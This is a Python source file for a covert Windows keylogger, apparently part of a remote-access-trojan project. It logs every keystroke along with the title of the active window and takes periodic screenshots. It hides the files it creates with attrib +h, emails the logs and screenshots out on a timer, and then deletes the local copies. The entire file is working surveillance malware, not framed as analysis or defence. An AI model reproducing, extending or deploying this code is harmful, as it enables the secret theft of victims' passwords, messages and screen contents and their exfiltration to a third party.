from pynput.keyboard import Key, Listener
from datetime import datetime
import subprocess
import ctypes
from ctypes import wintypes, windll, create_unicode_buffer
import socket
import time
import os, glob
from threading import Thread
import pyautogui
import re
from Email import *
#######################################################################
def get_capslock_state():
    hllDll = ctypes.WinDLL("User32.dll")
    VK_CAPITAL = 0x14
    return hllDll.GetKeyState(VK_CAPITAL)
#######################################################################
def getForegroundWindowTitle():
    hWnd = windll.user32.GetForegroundWindow()
    length = windll.user32.GetWindowTextLengthW(hWnd)
    buf = create_unicode_buffer(length + 1)
    windll.user32.GetWindowTextW(hWnd, buf, length + 1)

    return buf.value if buf.value else None


window = str(getForegroundWindowTitle())
#######################################################################
def add_window():
    global window
    try:
        if getForegroundWindowTitle() != window:
            with open(file_name, 'a') as file:
                file.write(f"({getForegroundWindowTitle()}) \n{get_time()}: ")
            window = getForegroundWindowTitle()
    except:
        pass
######################################################################
def get_time():
    time_format = datetime.now().strftime("%H:%M:%S")
    return time_format

def get_date():
    return datetime.now().strftime("%d/%m/%Y")
######################################################################
images_list = []
no_of_screenshots = 1

def screenshot_func():
    screenshot = pyautogui.screenshot()
    title = f"{get_time().replace(':', '-')}_{get_date().replace('/', '-')}_{name}.png"
    screenshot.save(title)
    images_list.append(title)
    subprocess.run(rf"attrib +h {path}{title}", shell=False)
    # print(images_list)

######################################################################
# option to convert to base64 obfuscate raw text

# pc_user = subprocess.run("whoami", capture_output=True, shell=False).stdout.decode().strip("\n")
# name, user = pc_user.split("\\")

name = socket.gethostname()
user = os.getlogin()
path = rf"C:\Users\{user}\PycharmProjects\pythonProject\RAT\\"
# path = r"C:\Windows\System32\\"

current_date = get_date()
current_time = get_time()

file_name = ""
previous_file_name = ""

msg = f'''{current_date} {current_time} | {name}/{user}

{get_time()}: '''

# 0 = Basic #1 = Verbose #2 XTRAVERBOSE
keybind_verbosity = 0  # \u0008 backspace ascii?
Keybinds = {
    "Key.backspace": {0: '[BS]', 1: '[BS]', 2: '[BACKSPACE]'},
    "Key.space": {0: ' ', 1: ' ', 2: '[SPACE]'},
    "Key.shift": {0: '', 1: ' [SHIFT]', 2: '[SHIFT]'},
    "Key.shift_r": {0: '', 1: ' [SHIFT]', 2: '[SHIFT.R]'},
    "Key.delete": {0: '', 1: '[DEL]', 2: '[DELETE]'},
    "Key.alt_l": {0: '', 1: '[ALT]', 2: '[ALT.L]'},
    "Key.alt_gr": {0: '', 1: '[ALT]', 2: '[ALT.R]'},
    "Key.ctrl_l": {0: '', 1: '[CTRL]', 2: '[CTRL.L]'},
    "Key.ctrl_r": {0: '', 1: '[CTRL]', 2: '[CTRL.R]'},
    "Key.tab": {0: '', 1: '[TAB]', 2: '[TAB]'},
    "Key.cmd": {0: '', 1: '[WIN.KEY]', 2: '[WINDOWS.KEY]'},
    "Key.insert": {0: '', 1: '[INS]', 2: '[INSERT]'},
    "Key.enter": {0: '', 1: '[ENTER]', 2: '[ENTER]'},

    "Key.up": {0: '', 1: '[UP]', 2: '[UP.KEY]'},
    "Key.down": {0: '', 1: '[DOWN]', 2: '[DOWN.KEY]'},
    "Key.left": {0: '', 1: '[LEFT]', 2: '[LEFT.KEY]'},
    "Key.right": {0: '', 1: '[RIGHT]', 2: '[RIGHT.KEY]'},
    "Key.print_screen": {0: '', 1: '[PRT.SCRN]', 2: '[PRINT.SCREEN]'},
    "Key.scroll_lock": {0: '', 1: '[SCROLL.LOCK]', 2: '[SCROLL.LOCK]'},
    "Key.caps_lock": {0: '', 1: '[CAPS]', 2: '[CAPS.LOCK]'},

    "Key.f1": {0: '', 1: '[F1]', 2: '[F1.KEY]'},
    "Key.f2": {0: '', 1: '[F2]', 2: '[F2.KEY]'},
    "Key.f3": {0: '', 1: '[F3]', 2: '[F3.KEY]'},
    "Key.f4": {0: '', 1: '[F4]', 2: '[F4.KEY]'},
    "Key.f5": {0: '', 1: '[F5]', 2: '[F5.KEY]'},
    "Key.f6": {0: '', 1: '[F6]', 2: '[F6.KEY]'},
    "Key.f7": {0: '', 1: '[F7]', 2: '[F7.KEY]'},
    "Key.f8": {0: '', 1: '[F8]', 2: '[F8.KEY]'},
    "Key.f9": {0: '', 1: '[F9]', 2: '[F9.KEY]'},
    "Key.f10": {0: '', 1: '[F10]', 2: '[F10.KEY]'},
    "Key.f11": {0: '', 1: '[F11]', 2: '[F11.KEY]'},
    "Key.f12": {0: '', 1: '[F12]', 2: '[F12.KEY]'},

    "Key.media_volume_mute": {0: '', 1: '[MUTE]', 2: '[VOLUME.MUTE]'},
    "Key.media_volume_down": {0: '', 1: '[VD]', 2: '[VOLUME.DOWN]'},
    "Key.media_volume_up": {0: '', 1: '[VU]', 2: '[VOLUME.UP]'},
    "Key.page_down": {0: '', 1: '[PAGE.DOWN]', 2: '[PAGE.DOWN]'},
    "Key.page_up": {0: '', 1: '[PAGE.UP]', 2: '[PAGE.UP]'},
    "Key.end": {0: '', 1: '[END]', 2: '[KEY.END]'},
    "Key.menu": {0: '', 1: '[MENU]', 2: '[KEY.MENU]'},
    "Key.num_lock": {0: '', 1: '[NUM.LOCK]', 2: '[NUM.LOCK]'},
}

max_length = 120
key_count = 0
# text write length variables

time_per_email = 15  # SECONDS
#Enter the number of seconds between each email

def time_log():
    global key_count
    global file_name
    global previous_file_name
    global images_list

    while True:
        file_name = f"{get_time().replace(':', '-')}_{get_date().replace('/', '-')}_{name}.txt"
        create_file = open(file_name, "w")
        create_file.write(msg)
        create_file.close()
        subprocess.run(rf"attrib +h {path}{file_name}", shell=False)

        for s in range(no_of_screenshots):
            time.sleep(time_per_email / no_of_screenshots)
            screenshot_func()
            # cleanup = Thread(target=time_log(), args=(), daemon=True)
        if keybind_verbosity == 0:
            try:
                g = open(file_name, "r")
                s = g.read()
                g.close()
                if "[BS]" in s:
                    out, i = "", 0
                    for m in re.finditer(r"(\s*\[BS\])+", s):
                        c = m.group(0).count("[BS]")
                        out += s[i: max(m.start() - c, 0)]
                        i = m.end()
                    out += s[i:]

                    with open(file_name, 'r+') as rewrite:
                        data = rewrite.read()
                        rewrite.seek(0)
                        rewrite.write(out)
                        rewrite.truncate()
            except:
                pass

        send_email(f"{get_date()} ~ {name}/{user}", images_list, file_name)
        # Send Email
        previous_file_name = file_name
        images_list.clear()
        key_count = 0

        for f in glob.glob(f'{path}*{name}.*'):
            try:
                os.remove(f)
            except OSError as e:
                print("Error: %s : %s" % (f, e.strerror))
                #Deleting files in folder


def write_to_file(key):
    global key_count, max_length
    keystr = str(key)
    keystr = keystr.lstrip("'").rstrip("'")
    # Strips quotation marks ''

    key_count += 1
    # Counts Keys

    add_window()
    # Gets window current window name

    if len(keystr) > 1:
        try:
            if keystr == "Key.enter":
                keystr = keystr.replace(keystr, Keybinds[keystr][0])
                keystr = f'\n{get_time()}: ' + keystr
            else:
                keystr = keystr.replace(keystr, Keybinds[keystr][keybind_verbosity])
        except:
            print(keystr)
            pass

    with open(file_name, 'a') as file:
        if int(get_capslock_state()) != 0:
            file.write(keystr.upper())
        else:
            file.write(keystr)

    if key_count > max_length:
        with open(file_name, 'a') as file:
            file.write("\n")
        key_count = 0

def main():
    with Listener(on_release=write_to_file) as listener:
        timer = Thread(target=time_log(), args=(), daemon=True)
        timer.start()
        listener.join()

if __name__ == '__main__':
    main()
